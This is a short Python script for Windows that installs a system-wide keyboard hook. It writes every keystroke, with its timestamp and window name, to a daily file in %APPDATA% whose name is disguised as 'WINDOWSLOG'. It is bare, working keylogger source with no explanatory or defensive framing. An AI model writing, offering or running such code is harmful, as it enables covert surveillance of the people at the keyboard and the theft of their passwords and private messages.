import pythoncom
import pyHook
import os
import random
import datetime

def OnKeyboardEvent(event):
    directory = os.popen('echo %APPDATA%').read().strip('\r\n')
    directory = str(directory).replace("\\", '/')
    os.chdir(directory)
    now = datetime.datetime.now()
    if os.path.exists(r'WINDOWSLOG-%d-%d-%d.txt' % (now.month, now.day, now.year)):
        file = open('WINDOWSLOG-%d-%d-%d.txt' % (now.month, now.day, now.year), 'a')
        file.write('Data: (%s), (%s), (%s), (%s)\n' % (event.Time, event.Window, event.WindowName, event.Key))
        file.close() 
    else:
        file = open('WINDOWSLOG-%d-%d-%d.txt' % (now.month, now.day, now.year), 'w')
        file.write('Data: (%s), (%s), (%s), (%s)\n' % (event.Time, event.Window, event.WindowName, event.Key))
        file.close() 
    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages() 